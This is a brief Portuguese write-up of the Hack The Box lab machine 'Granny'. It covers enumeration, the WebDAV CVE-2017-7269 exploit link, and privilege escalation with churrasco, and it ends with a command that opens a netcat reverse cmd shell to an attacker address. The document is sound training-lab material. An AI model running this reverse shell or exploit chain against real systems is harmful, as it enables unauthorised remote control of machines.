Enumeração de serviços:
![[Write-up/Hack The Box/Granny/img/Pasted image 20240228114434.png]]
Descoberta de arquivos importantes, indicando que o servidor possui o FrontPage instalado:
![[Write-up/Hack The Box/Granny/img/Pasted image 20240228130926.png]]
Depois de perder um tempo procurando formas de explorar o FrontPage, foquei nas vulnerabilidades do webdav e encontrei a CVE -2017-7269 e o seguinte exploit:
https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
![[Write-up/Hack The Box/Granny/img/Pasted image 20240228142323.png]]
Vamos utilizar o exploit churrasco para escalar privilégio:
![[Write-up/Hack The Box/Granny/img/Pasted image 20240228154236.png]]

```powershell
churrasco.exe -d "C:\Windows\Temp\nc.exe 10.10.14.9 1244 -e C:\Windows\System32\cmd.exe"

```